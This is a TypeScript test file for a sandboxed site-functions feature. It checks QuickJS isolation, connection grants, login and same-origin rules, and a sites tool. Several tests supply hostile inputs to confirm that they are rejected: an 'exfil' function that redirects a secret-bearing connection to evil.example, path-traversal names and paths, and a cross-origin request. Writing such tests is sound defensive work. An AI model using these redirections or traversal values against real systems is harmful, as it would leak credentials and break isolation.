// @vitest-environment node
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import fastify from "fastify";
import { afterAll, afterEach, expect, test, vi } from "vite-plus/test";
import { createSite, resolveSiteFile, setSitePublic } from "./sites";
import {
  deleteSiteFunction,
  executeSiteFunction,
  registerSiteFunction,
  siteConnectionGrant,
} from "./site-functions";
import { closeSiteFunctionRuntime } from "./site-isolation";
import { registerSiteRoutes } from "./routes/sites";
import type { AppConfig } from "./config";
import { createSitesTool } from "./custom-tools";
import type { SiteFunction } from "@/shared/site-functions";

const directories: string[] = [];
afterAll(closeSiteFunctionRuntime);
afterEach(async () => {
  vi.unstubAllEnvs();
  await Promise.all(
    directories.splice(0).map((directory) => rm(directory, { recursive: true, force: true })),
  );
});
async function fixture() {
  const root = await mkdtemp(join(tmpdir(), "batty-functions-"));
  directories.push(root);
  const site = await createSite(root, "", "Test");
  await writeFile(join(site.directory, "index.html"), "<h1>Test</h1>");
  return { root, id: site.descriptor.id, site };
}

test("site-scoped isolated QuickJS transforms input without Node and definitions cannot be served", async () => {
  const { root, id } = await fixture();
  const other = await createSite(root, "", "Other");
  await registerSiteFunction(root, id, "double", {
    code: "const input = await tools.input(); return {value: input.value * 2, node: typeof process, fetch: typeof fetch, filesystem: typeof require};",
  });
  expect(await executeSiteFunction(root, id, "double", { value: 21 })).toEqual({
    value: 42,
    node: "undefined",
    fetch: "undefined",
    filesystem: "undefined",
  });
  await expect(executeSiteFunction(root, other.descriptor.id, "double", {})).rejects.toThrow(
    "not found",
  );
  await expect(resolveSiteFile(root, "", id, "../functions/double.json")).rejects.toThrow(
    "Invalid site path",
  );
  await expect(resolveSiteFile(root, "", id, "functions/double.json")).rejects.toThrow("not found");
  await expect(
    registerSiteFunction(root, id, "../escape", { code: "return null" }),
  ).rejects.toThrow("Invalid function name");
  await deleteSiteFunction(root, id, "double");
  await expect(executeSiteFunction(root, id, "double", {})).rejects.toThrow("not found");
});

test("function authors cannot register destinations/secrets, override a host grant, or use another site's grant", async () => {
  const { root, id } = await fixture();
  const grant = {
    url: "https://api.example/generate",
    secretHeaders: { Authorization: { env: "BATTY_SITE_SECRET_IMAGES", prefix: "Bearer " } },
  };
  vi.stubEnv("BATTY_SITE_CONNECTIONS", JSON.stringify({ [id]: { images: grant } }));
  expect(siteConnectionGrant(id, "images")).toEqual(grant);
  expect(() => siteConnectionGrant("another-site", "images")).toThrow("not granted");
  expect(() => siteConnectionGrant(id, "toString")).toThrow("not granted");
  await expect(
    registerSiteFunction(root, id, "exfil", {
      code: "return null",
      connections: { images: { ...grant, url: "https://evil.example/" } },
    } as SiteFunction),
  ).rejects.toThrow("host-admin grants");
  await registerSiteFunction(root, id, "exfil", {
    code: "try { return await tools.request({connection:'images',url:'https://evil.example/'}); } catch(error) { return error.message; }",
  });
  await expect(executeSiteFunction(root, id, "exfil", null)).rejects.toThrow("worker protocol");
  await registerSiteFunction(root, id, "ungranted", {
    code: "try { return await tools.request({connection:'other'}); } catch(error) { return error.message; }",
  });
  expect(await executeSiteFunction(root, id, "ungranted", null)).toBe("Connection request failed");
});

test("paid routes require login and same origin even for public/capability-preview sites", async () => {
  const { root, id, site } = await fixture();
  await setSitePublic(root, "", id, true);
  await registerSiteFunction(root, id, "echo", { code: "return await tools.input()" });
  const app = fastify();
  app.decorateRequest("auth", false);
  app.addHook("onRequest", async (request) => {
    request.auth = request.headers.authorization === "fixture";
  });
  registerSiteRoutes({
    app,
    config: { sitesDir: root, baseUrl: "" } as AppConfig,
    routePath: (route) => route,
  });
  try {
    const url = `/api/sites/${id}/functions/echo`;
    const invoke = (headers: Record<string, string> = {}) =>
      app.inject({ method: "POST", url, headers, payload: { input: { hello: 42 } } });
    expect((await invoke()).statusCode).toBe(401);
    for (const origin of [undefined, "null", "https://evil.example"]) {
      expect(
        (await invoke({ authorization: "fixture", ...(origin ? { origin } : {}) })).statusCode,
      ).toBe(403);
    }
    const response = await invoke({ authorization: "fixture", origin: "http://localhost:80" });
    expect(response.statusCode).toBe(200);
    expect(response.json()).toEqual({ value: { hello: 42 } });
    expect((await app.inject(site.browserUrl)).statusCode).toBe(200);
    expect((await app.inject("/site-runtime.js")).body).toContain("window.batty");
  } finally {
    await app.close();
  }
});

test("sites tool registers, replaces and deletes code without echoing definitions", async () => {
  const { root, id } = await fixture();
  const tool = createSitesTool({
    config: { sitesDir: root, baseUrl: "" } as AppConfig,
  } as Parameters<typeof createSitesTool>[0]);
  const result = await tool.execute(
    "register",
    { action: "function", siteId: id, functionName: "answer", code: "return 42" },
    undefined,
    undefined,
    {} as never,
  );
  expect(result.content).toEqual([{ type: "text", text: "Site function answer registered." }]);
  expect(await executeSiteFunction(root, id, "answer", null)).toBe(42);
  await tool.execute(
    "replace",
    { action: "function", siteId: id, functionName: "answer", code: "return 43" },
    undefined,
    undefined,
    {} as never,
  );
  expect(await executeSiteFunction(root, id, "answer", null)).toBe(43);
  await tool.execute(
    "remove",
    { action: "delete_function", siteId: id, functionName: "answer" },
    undefined,
    undefined,
    {} as never,
  );
  await expect(executeSiteFunction(root, id, "answer", null)).rejects.toThrow("not found");
});
